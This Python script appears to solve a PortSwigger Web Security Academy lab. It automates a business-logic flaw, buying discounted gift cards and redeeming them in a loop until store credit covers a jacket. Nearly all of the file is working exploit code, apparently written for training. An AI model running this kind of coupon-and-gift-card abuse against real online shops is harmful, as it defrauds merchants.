import http.client
import re
import ssl
import urllib.parse

from bs4 import BeautifulSoup

LAB_ID = "???"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_cart(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/cart'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_cart(
        session: str,
        product_id: int,
        quantity: int,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/cart'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/product?productId=1',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = [
        ('productId', product_id),
        ('redir', 'CART'),
        ('quantity', quantity),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_cart_coupon(
        session: str,
        csrf: str,
        coupon: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/cart/coupon'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/cart',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
        ('coupon', coupon),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_cart_checkout(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/cart/checkout'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_cart_orderconfirmation(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/cart/order-confirmation'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def GET_myaccount(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/my-account'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('id', 'wiener'),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def POST_giftcard(
        session: str,
        csrf: str,
        code: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/gift-card'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
        ('gift-card', code),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def cart_csrf(session: str) -> str:
    response = GET_cart(session)
    response_body = response.read().decode('utf-8')
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response_body)[0]
    return csrf


def cart_value(session: str) -> float:
    response = GET_cart(session)
    response_body = response.read().decode('utf-8')
    value = re.findall(r'<th>\$([0-9]+.[0-9]+)</th>', response_body)[0]
    return float(value)


def login_csrf() -> tuple[str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


def login_session():
    session, csrf = login_csrf()
    response = POST_login(session, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def redeem_gift_card(
        session: str,
        gift_card: str,
):
    response = GET_myaccount(session)
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    POST_giftcard(session, csrf, code=gift_card)


def buy_product(
        session: str,
        product_id: int,
        coupon: str | None = None,
        quantity: int = 1,
):
    POST_cart(session, product_id, quantity)
    if discount_code:
        csrf = cart_csrf(session)
        POST_cart_coupon(session, csrf, coupon)
    csrf = cart_csrf(session)
    POST_cart_checkout(session, csrf)


def last_gift_cards(
        session: str,
        cards_num: int,
) -> list[str]:
    response_body = GET_cart_orderconfirmation(session).read().decode()
    soup = BeautifulSoup(response_body, 'html.parser')
    for tbody in soup.find_all("tbody"):
        trs = tbody.find_all("tr")
        if len(trs) < 2 or trs[0].find_next("th").contents[0] != "Code":
            continue
        codes = []
        for i in range(1, cards_num + 1):
            codes.append(trs[i].find_next("td").contents[0])
        return codes
    return []


def store_credit(
        session: str,
) -> float:
    response_body = GET_myaccount(session).read().decode()
    soup = BeautifulSoup(response_body, 'html.parser')
    content = soup.find_all("strong")[0].contents[0]
    balance = re.findall(r"\$([0-9]+.[0-9]+)$", content)[0]
    return float(balance)


gift_card_id = 2
gift_card_price = 10.0
l33t_jacket_price = 1337.0
discount_code = 'SIGNUP30'
discount = 0.3
session = login_session()
credit = store_credit(session)
while credit < l33t_jacket_price * (1 - discount):
    cards_num = int(credit / (gift_card_price * (1 - discount)))
    cards_num = min(cards_num, 50)
    print(f"buying {cards_num} gift cards")
    buy_product(session, product_id=gift_card_id, coupon=discount_code, quantity=cards_num)
    gift_cards = last_gift_cards(session, cards_num)
    for gift_card in gift_cards:
        print(f"redeeming gift card: {gift_card}")
        redeem_gift_card(session, gift_card)
    credit = store_credit(session)
    print(f"store credit: {credit}")
print("""go to the browser and buy Lightweight "l33t" Leather Jacket""")
